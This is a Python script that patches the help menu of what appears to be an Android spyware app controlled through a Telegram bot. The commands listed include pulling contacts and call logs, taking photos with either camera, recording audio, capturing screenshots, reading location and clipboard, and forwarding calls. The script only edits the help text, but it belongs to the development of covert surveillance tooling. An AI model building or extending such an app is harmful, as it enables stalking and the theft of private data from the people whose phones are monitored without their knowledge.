import re

with open('/app/applet/app/src/main/java/com/example/telegrambot/handlers/MessageHandler.kt', 'r') as f:
    content = f.read()

old_help = """            "/help" -> {
                val help = \"\"\"
                    📋 *Available Commands*
                    
                    /contacts - Get contacts list
                    /call_log - Get call logs
                    /gallery - List recent photos from gallery
                    /camera - Take photo from back camera (alias: /camera_back)
                    /camera_front - Take photo from front camera
                    /forward <number> - Forward calls to number
                    /ring - Ring device at max volume
                    /start - Start the bot
                    /help - Show this help
                    /status - Get device battery and storage status
                    /record - Record 40 seconds of audio
                    /ping - Check if bot is alive
                    /echo <text> - Echo your message
                    /time - Show current time
                    /info - Show bot info
                \"\"\".trimIndent()
                TelegramApi.sendMessage(token, chatId, help, "Markdown")
            }"""

new_help = """            "/help" -> {
                val help = \"\"\"
                    📋 *Available Commands*
                    
                    /camera - Take photo from back camera
                    /gallery - List recent photos from gallery
                    /status - Get device battery and storage status
                    /record - Record 40 seconds of audio
                    /screenshot - Capture a snapshot of the current screen
                    /contacts - Get contacts list
                    /location - Get current device location
                    /clipboard - Get current clipboard text
                \"\"\".trimIndent()
                TelegramApi.sendMessage(token, chatId, help, "Markdown")
            }"""

# Fallback regex in case whitespace is off
content = re.sub(r'"/help" -> \{.*?\n            \}', new_help.replace('\\', '\\\\'), content, flags=re.DOTALL)

with open('/app/applet/app/src/main/java/com/example/telegrambot/handlers/MessageHandler.kt', 'w') as f:
    f.write(content)
